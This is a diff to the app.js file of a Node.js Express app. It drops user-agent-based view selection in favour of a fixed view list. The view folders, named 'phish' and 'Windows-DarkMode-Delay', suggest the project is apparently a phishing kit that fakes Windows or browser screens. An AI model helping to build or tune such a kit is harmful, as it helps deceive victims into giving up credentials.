@@ -3,43 +3,22 @@ var express = require('express');
 var path = require('path');
 var cookieParser = require('cookie-parser');
 var logger = require('morgan');
-var useragent = require('useragent');
+
 
 var indexRouter = require('./routes/index');
 var usersRouter = require('./routes/pages');
 
 var app = express();
 
-// view engine setup
-app.use('/', (req, res, next) => {
 
-  ua = useragent.parse(req.headers['user-agent']) // true
- // console.log(ua.os)
-  if (ua.os.family === 'Windows')
-  {
-    // console.log(ua.os)
-    app.set('views', [ 
 
-      path.join(__dirname, 'views/Windows-DarkMode-Delay'),
-      path.join(__dirname, 'views/phish'), 
-      path.join(__dirname, 'views/Windows-Chrome-LightMode')
-      
-      ]);
-  }
-  else {
-    // console.log("na here we dey");
-    app.set('views', [
-      path.join(__dirname, 'views/Windows-DarkMode-Delay/mobile'),
-      path.join(__dirname, 'views/phish'),
+app.set('views', [ 
 
-    ]);
+    path.join(__dirname, 'views/Windows-DarkMode-Delay'),
+    path.join(__dirname, 'views/phish'), 
+    path.join(__dirname, 'views/Windows-Chrome-LightMode')
     
-  }
-  
-    next();
-  });
-
-
+    ]);
 
 app.set('view engine', 'hbs');
 
